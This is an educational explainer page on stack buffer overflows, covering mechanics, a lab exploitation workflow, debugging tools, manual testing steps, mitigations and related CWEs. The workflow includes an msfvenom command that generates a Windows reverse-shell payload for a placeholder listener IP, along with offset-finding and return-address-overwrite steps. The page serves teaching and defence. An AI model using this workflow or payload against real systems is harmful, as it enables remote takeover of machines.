# What is a Buffer Overflow?

A Buffer Overflow happens when a program writes more data into a fixed-size buffer than it can hold, spilling into adjacent memory. In unsafe languages like C and C++, that overwrite can clobber the saved return address and redirect execution to attacker-controlled code. It is the foundation of classic memory-corruption exploitation and still shows up in firmware, drivers, and legacy binaries.

## How it works

- A buffer of N bytes receives more than N bytes of input
- The overflow overwrites the saved return address (EIP/RIP) on the stack
- Control jumps to attacker-supplied shellcode or a ROP chain

## Exploitation workflow (lab)

```bash
# 1. Find the offset to EIP with a cyclic pattern
msf-pattern_create -l 2000

# 2. After the crash, find where the pattern landed
msf-pattern_offset -l 2000 -q 39694438

# 3. Confirm control of EIP (send offset bytes + "BBBB")
python3 -c 'print("A"*offset + "BBBB")'

# 4. Find bad characters, locate a JMP ESP, then place shellcode
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=4444 -b '\x00' -f python
```

```gdb
# Inspect the crash in a debugger
gdb ./vuln
run $(python3 -c 'print("A"*100)')
info registers        # is RIP/EIP overwritten with 0x41414141?
```

## Tools

- [GDB](https://www.gnu.org/software/gdb/) + [pwndbg](https://github.com/pwndbg/pwndbg) / [GEF](https://github.com/hugsy/gef)
- [pwntools](https://github.com/Gallopsled/pwntools) - scripting exploit development
- [Immunity Debugger + mona.py](https://www.immunityinc.com/products/debugger/) - Windows workflow
- [checksec](https://github.com/slimm609/checksec.sh) - inspect binary protections

## Manual testing

1. Fuzz inputs with growing lengths until the program crashes
2. Use a cyclic pattern to find the exact offset to the return address
3. Identify bad characters that mangle your payload
4. Redirect execution (JMP ESP / ret2libc / ROP) to your shellcode

## Mitigation

- Use memory-safe languages or safe functions (`strncpy`, `snprintf`, bounds checks)
- Keep compiler defenses on: stack canaries, ASLR, DEP/NX, RELRO, PIE
- Fuzz binaries and run static/dynamic analysis in CI
- Patch and retire legacy unsafe C/C++ components

## Deep dive

- [Buffer Overflow - Vulnerability Explain](https://securitycipher.com/vulnerability-explain/)
- [Exploit Education: Phoenix/Protostar](https://exploit.education/)

## CWE

- CWE-120: Buffer Copy without Checking Size of Input
- CWE-787: Out-of-bounds Write
